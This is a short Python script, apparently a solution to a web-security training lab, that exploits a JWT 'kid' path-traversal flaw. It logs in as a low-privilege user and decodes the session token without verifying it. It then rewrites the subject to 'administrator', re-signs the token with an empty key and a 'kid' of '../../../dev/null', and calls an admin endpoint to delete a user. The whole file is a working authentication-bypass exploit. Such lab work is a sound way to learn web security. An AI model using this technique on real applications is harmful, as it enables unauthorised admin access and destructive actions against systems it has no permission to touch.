import jwt
import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
delete_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()

response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"csrf": csrf,"username": "wiener", "password": "peter"}

response = session.post(login_url, data=burp_data, allow_redirects=False)
cookies = response.cookies
session_cookie = cookies.get('session')

decoded_token = jwt.decode(session_cookie, options={"verify_signature": False})
decoded_token['sub'] = 'administrator'
modified_token = jwt.encode(decoded_token, '', algorithm='HS256', headers={"kid": "../../../dev/null"})

burp_cookie = {"session": modified_token}
session.get(delete_url, cookies=burp_cookie)
